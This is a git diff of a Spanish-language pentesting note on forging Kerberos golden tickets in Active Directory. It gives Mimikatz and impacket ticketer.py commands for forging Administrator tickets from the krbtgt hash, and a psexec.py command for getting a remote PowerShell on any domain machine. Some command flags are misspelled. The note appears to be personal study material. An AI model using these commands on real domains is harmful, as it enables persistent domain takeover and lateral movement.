@@ -34,7 +34,6 @@ Esto nos dará algo similar a esto:
 
 ![[Pasted image 20250428160113.png]]
 
-<<<<<<< HEAD
 Aqui ya estarán todos los datos que necesitamos para construir el golden ticket.
 
 Ahora tenemos dos opciones:
@@ -42,9 +41,7 @@ Ahora tenemos dos opciones:
 - 1. Usar esto para contruir un golden.kirbi el cual nos servirá para acceder a cualquier recurso del sistema desde una maquina windows a otra, Ejemplo: PC-Juan queriendo acceder a admin$ del dc (\\\\DC-Company\\admin$) cosa que no se puede hacer normalmente.
 
 - 2. Usar esto junto a ticketer para que el golden ticket tenga un formato ccache el cual nos permitiría acceder a cualquier maquina del dominio (la mejor opción)
-=======
-Aqui ya estarán todos los datos que necesitamos para construir el golden ticket, solo que podemos hacerlo de dos formas, y cada una es para hacer algo diferent:
-## Tener privilegios sobre un equipo desde una maquina Windows (con Mimikatz)
+## Tener privilegios sobre un equipo desde una maquina Windows (Primera opción)
 
 Para esto vamos a crear un archivo golden.kirbi, luego, este lo vamos a injectar en la memoria, permitiendo que cuando esta maquina solicite un recurso privilegiado se envie el Golden ticket, permitiendo así el acceso:
 
@@ -52,12 +49,24 @@ Para esto vamos a crear un archivo golden.kirbi, luego, este lo vamos a injectar
 kerberos::golden /domain:\[Dominio] /sid:\[SID del usuario krbtgt] /rc4:\[Hash NT] /user:Administrador /ticket:golden.kirbi
 ```
 
-## Acceder a cualquier maquina desde nuestra maquina atacante
+## Acceder a cualquier maquina desde nuestra maquina atacante (Segunda opción)
 
 Para esto vamos a crear un archivo Administrador.ccache el cual se va a enviar para autenticarse a las maquinas como el usuario Administrador:
 
+Usaremos la herramienta tiketer: 
 
->>>>>>> fb24da824488e89914e3210da4ad11afb8955748
+```Python
+ticketer.py -ntmlhash {HASH_NT_del_usuario_krbtgt} -doamin-sid {SID_del_dominio} -domain {NOMBRE_DEL_DOMINIO} {USUARIO_QUE_QUEREMOS_IMPERSONALIZAR}
+```
 
+Ahora, vamos a hacer una variable de entorno llamada KRB5CCNAME, la cual va a contener la ruta hacia el archivo Administrador.ccache, ahora vamos a usar psexec para conectarnos a cualquier maquina usando este ticket: 
+
+```Python
+psexec.py -n -k juancorp.local/Administrador@{IP_EQUIPO} powershell.exe 
+```
+
+Ahora aunque el administrador cambie su contraseña igual podremos seguir estableciendo conexión, ya que esto no depende de esa contraseña del admin, sino de la contraseña de krbtgt 
 ##### Recursos 
 - [Hack Tricks](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html?highlight=Mimikatz#mimikatz)
+
+
